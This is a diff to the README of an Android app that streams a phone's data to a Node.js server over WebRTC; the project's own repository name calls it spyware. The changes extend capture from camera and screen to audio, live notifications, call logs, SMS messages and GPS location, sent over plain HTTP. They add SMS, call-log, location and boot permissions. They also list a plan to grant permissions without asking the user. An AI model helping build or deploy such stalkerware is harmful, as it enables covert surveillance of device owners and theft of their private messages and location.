@@ -40,12 +40,12 @@ project/
 
 ### Key Components
 
-- **StreamingService.java**: Android service that initializes WebRTC, captures camera, audio, and screen, and handles signaling with the server
-- **StreamingSettingsActivity.java**: UI to toggle streaming and request permissions (camera, audio, screen capture)
+- **StreamingService.java**: Android service that initializes WebRTC, captures camera, audio, live notifications, call logs, sms messages and gps location and handles signaling with the server
+- **StreamingSettingsActivity.java**: UI to toggle streaming and request permissions (camera, audio, live notifications, call logs, sms messages and gps location)
 - **AndroidManifest.xml**: Declares permissions and service configuration
-- **network_security_config.xml**: Allows the Android Application to send cleartext traffic to the Web Server.
+- **network_security_config.xml**: Allows the Android Application to send cleartext traffic to the Web Server over exposed HTTP Connection.
 - **server.js**: Node.js server using Express and Socket.IO for signaling between Android and web clients
-- **index.html**: Web interface displaying camera (remoteVideo) and screen (screenVideo) streams
+- **index.html**: Web interface displaying camera, audio, live notifications, call logs, sms messages and gps location streams.
 - **client.js**: JavaScript for WebRTC peer connection, track handling, and signaling on the web client
 
 ## Prerequisites
@@ -74,7 +74,7 @@ project/
 ### 1. Clone the Repository
 
 ```bash
-git clone <repository-url>
+git clone https://github.com/DhruvAthaide/Android_WebRTC_Spyware.git
 cd project
 ```
 
@@ -87,8 +87,21 @@ Open the `android/` folder in Android Studio.
 
 ```gradle
 dependencies {
-    implementation 'org.webrtc:google-webrtc:1.0.32006'
-    implementation 'io.socket:socket.io-client:2.1.0'
+    implementation ("androidx.appcompat:appcompat:1.6.1")
+    implementation ("androidx.core:core-ktx:1.12.0")
+    implementation ("androidx.recyclerview:recyclerview:1.3.2")
+    implementation ("com.google.android.material:material:1.11.0")
+    implementation ("androidx.activity:activity-ktx:1.8.2")
+    implementation ("androidx.constraintlayout:constraintlayout:2.1.4")
+    implementation ("com.google.android.gms:play-services-location:21.0.1")
+    testImplementation ("junit:junit:4.13.2")
+    androidTestImplementation ("androidx.test.ext:junit:1.1.5")
+    androidTestImplementation ("androidx.test.espresso:espresso-core:3.5.1")
+    implementation ("io.getstream:stream-webrtc-android:1.0.4")
+    implementation ("androidx.cardview:cardview:1.0.0")
+    implementation ("androidx.preference:preference:1.2.1")
+    implementation ("com.squareup.okhttp3:okhttp:4.12.0")
+    implementation ("io.socket:socket.io-client:2.0.1")
 }
 ```
 
@@ -105,7 +118,7 @@ ice.add(PeerConnection.IceServer.builder("turn:numb.viagenie.ca")
 #### Update Signaling URL (if needed)
 In `StreamingService.java`, ensure `SIGNALING_URL` matches your server's IP:
 ```java
-private static final String SIGNALING_URL = "http://<Input your WebRTC Server IP>:3000";
+private static final String SIGNALING_URL = "http://<Your Server IP address>:3000";
 ```
 
 In `network_security_config.xml`, ensure that `<domain>` matches your server's IP:
@@ -117,11 +130,19 @@ In `network_security_config.xml`, ensure that `<domain>` matches your server's I
 Ensure the following are included:
 
 ```xml
+<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+<uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
 <uses-permission android:name="android.permission.CAMERA" />
 <uses-permission android:name="android.permission.RECORD_AUDIO" />
 <uses-permission android:name="android.permission.INTERNET" />
+<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+<uses-permission android:name="android.permission.SET_WALLPAPER" />
 <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
 <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
+<uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
+<uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
+<uses-permission android:name="android.permission.READ_SMS" />
+<uses-permission android:name="android.permission.READ_CALL_LOG" />
 ```
 
 ### 3. Configure Server
@@ -313,6 +334,8 @@ When seeking support, provide:
 
 ## Future Improvements
 
+- Adding Permissions which will automatically be given without asking the user for permissions
+- Adding Screen Sharing Video Track on the WebRTC Server
 - Add dynamic resolution adjustment based on device capabilities
 - Implement bitrate control for better stream quality on varying networks
 - Add error handling for network disconnections with automatic reconnect
